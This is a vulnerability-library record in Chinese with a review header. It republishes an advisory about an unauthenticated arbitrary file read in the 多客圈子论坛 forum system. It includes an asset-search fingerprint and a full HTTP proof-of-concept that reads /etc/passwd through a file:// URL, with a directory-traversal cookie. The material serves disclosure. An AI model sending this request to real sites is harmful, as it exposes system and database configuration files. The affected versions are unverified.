---
source: "gelusus/wxvl 公众号漏洞文库"
title: "多客圈子论坛 httpGet file协议读取"
product: "多客圈子论坛"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "版本全部依赖未视检图片，修复未给具体版本"
prerequisites: "称匿名却带PHPSESSID及think_var"
side_effects: "现有材料未完整列明副作用；示例不保证只读或无状态变化"
review_date: "2026-10-02"
source_status: "unknown"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%95%86%E4%B8%9A%E8%BD%AF%E4%BB%B6/%E5%A4%9A%E5%AE%A2%E5%9C%88%E5%AD%90%E8%AE%BA%E5%9D%9B%E7%B3%BB%E7%BB%9F/%E5%A4%9A%E5%AE%A2%E5%9C%88%E5%AD%90%E8%AE%BA%E5%9D%9B%E7%B3%BB%E7%BB%9F%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%20%E9%99%84POC.md"
id: "vw-ec3a3ea4fc0f792afa153fe7"
entity_id: "ve-ec3a3ea4fc0f792afa153fe7"
schema_version: "1"
---

# 多客圈子论坛 httpGet file协议读取

## 条目说明

- 对象与具体问题：多客圈子论坛；httpGet file协议读取
- 版本、配置及部署条件：版本全部依赖未视检图片，修复未给具体版本
- 认证与权限前提：称匿名却带PHPSESSID及think_var
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- think_var目录穿越Cookie与URL file读取机制不同，可能串入另一ThinkPHP路径问题，应单独解释或移除残留
- 图片增量待核
- 图片影响版本无法文字检索，补实际版本、返回和补丁来源
- 空标题/往期回顾及装饰应清理

## 操作风险

现有材料未完整列明副作用；示例不保证只读或无状态变化。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。

## 技术资料与来源记录

原创 安服仔
                    安服仔  北风漏洞复现文库   2026-01-29 01:22  
  
## 免责声明：请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。  
##   
##   
  
01  
  
—  
  
漏洞名称  
  
多客圈子论坛系统任意文件读取漏洞  
  
02  
  
—  
  
影响版本  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/dV0OibMDwBhLTxND8mIPwiaca3HjpxsgMOHJiaPmELuHYPfCHgM308zZYsdRqhJOMrG4SCgMxibX5h14xETWictrwTg/640?wx_fmt=png&from=appmsg&watermark=1&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=0 "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dV0OibMDwBhJyLoQ2TobeEXuUIwfOCfaRRY5snD0J4jqaWoEyXUYycrmgrya59pottW1Hvn28FzlqiaKgAOQWZEw/640?wx_fmt=png&from=appmsg "")  
  
  
03  
  
—  
  
漏洞简介  
  
多客圈子论坛系统是一种面向特定人群或特定话题的社交网络，它提供了用户之间交流、分享、讨论的  
平台。在这个系统中，用户可以创建、加入不同的圈子，圈子可以是基于兴趣、地域、职业等不同主题的。用户可以在圈子中发帖、评论、点赞等互动。社交圈子论坛系统除了提供基本的社交功能外，还可以根据用户行为和兴趣为用户推荐相关内容  
。  
未经身份验证的攻击者可通过该接口构造恶意请求，利用curl_exec  
函数读取系统重要文件，如/etc/passwd  
（Linux 系统用户信息文件）或数据库配置文件等。  
  
  
04  
  
—  
  
资产测绘  
```
body="/static/index/js/jweixin-1.2.0.js"
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dV0OibMDwBhJyLoQ2TobeEXuUIwfOCfaRBaDnFrf3fbVxcIicKnxy8ofUTz6APS4rVC1FDXcdYwgvPDsKL6Zug9g/640?wx_fmt=png&from=appmsg "")  
  
  
05  
  
—  
  
漏洞复现  
  
POC  
```http
GET /index.php/api/login/httpGet?url=file:///etc/passwd HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:146.0) Gecko/20100101 Firefox/146.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: think_var=..%2F..%2Fapplication%2Fdatabase; PHPSESSID=m************************5
Upgrade-Insecure-Requests: 1
Priority: u=0, i
Pragma: no-cache
Cache-Control: no-cache
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dV0OibMDwBhJyLoQ2TobeEXuUIwfOCfaRGnZwxXmcNuTjJeDicos7Q4e1OZBPpicp0RaXiajPxmGCvApHI40Awe3ZA/640?wx_fmt=png&from=appmsg "")  
  
  
06  
  
—  
  
修复建议  
  
升级至最新版本  
  
  
  
07  
  
—  
  
往期回顾  
  
  
  
  


---

> 来源：gelusus/wxvl（微信公众号漏洞文章自动归档，原文见文首链接）
